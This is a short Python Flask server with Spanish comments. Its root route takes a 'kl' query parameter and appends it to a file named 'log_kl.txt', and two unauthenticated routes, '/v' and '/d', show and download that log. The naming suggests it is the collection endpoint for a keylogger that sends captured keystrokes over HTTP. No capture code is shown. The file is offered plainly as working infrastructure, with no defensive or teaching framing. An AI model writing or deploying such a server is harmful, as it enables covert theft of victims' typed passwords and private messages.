from flask import Flask, request, send_file
import os

app = Flask(__name__)

# Ruta al archivo de texto para almacenar los textos
archivo_texto = 'log_kl.txt'

@app.route('/', methods=['GET'])
def index():
    texto_recibido = request.args.get('kl', '')
    with open(archivo_texto, 'a') as file:
        caracteres_escritos = file.write(texto_recibido)
        if caracteres_escritos > 0:
            return f"Escritura exitosa. {caracteres_escritos} caracteres fueron escritos en el archivo."
        else:
            return "No se pudo escribir en el archivo."

    return "503.\n"
    
    
    
    # Almacena el texto en el archivo de texto
    with open(archivo_texto, 'a') as file:
        file.write(texto_recibido)
        #file.write(texto_recibido + '\n<br/><br/><br/>\n\n\n\n')

    return "503.\n"

@app.route('/v', methods=['GET'])
def view():
    try:
        if os.path.exists(archivo_texto):
            with open(archivo_texto, 'r') as file:
                contenido = file.read()
            return contenido
        else:
            return "El archivo de texto no existe."
    except Exception as e:
        return f"Error al leer el archivo: {str(e)}"

@app.route('/d', methods=['GET'])
def download():
    try:
        if os.path.exists(archivo_texto):
            return send_file(archivo_texto, as_attachment=True)
        else:
            return "El archivo de texto no existe."
    except Exception as e:
        return f"Error al descargar el archivo: {str(e)}"

if __name__ == '__main__':
    app.run(debug=True, port=os.getenv("PORT", default=5000))
